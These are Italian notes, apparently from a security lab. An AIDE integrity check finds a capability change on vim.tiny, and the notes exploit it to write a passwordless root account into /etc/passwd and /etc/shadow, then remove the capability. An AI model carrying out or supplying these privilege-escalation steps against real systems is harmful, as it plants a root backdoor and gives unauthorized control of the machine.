sudo aide -c /etc/aide/aide.conf -C

Vengono rilevate modifiche ai file
- /usr/bin/cp
- /usr/bin/vim.tiny
- /usr/bin/tee

Aide rileva una modifica alle capabilities dei vari file

Facendo getcap sui file modificati si ottiene che il comando /usr/bin/vim.tiny
ha impostato la capability 
/usr/bin/vim.tiny cap_dac_override=ep

Significa che vengono ignorati tutti i permessi di accesso ai file
man capabilities

In questo modo possiamo modificare i file /etc/passwd e /etc/shadow

/usr/bin/vim.tiny /etc/passwd
Inseriamo come ultima riga
toor:x:0:0:toor,,,:/root:/bin/bash

:wq! per uscire

/usr/bin/vim.tiny /etc/shadow
Inseriamo come ultima riga
toor::19043:0:99999:7:::

:wq! per uscire

#Entriamo come toor
su toor


#Per rimuovere la capability
sudo setcap cap_dac_override-ep /usr/bin/vim.tiny

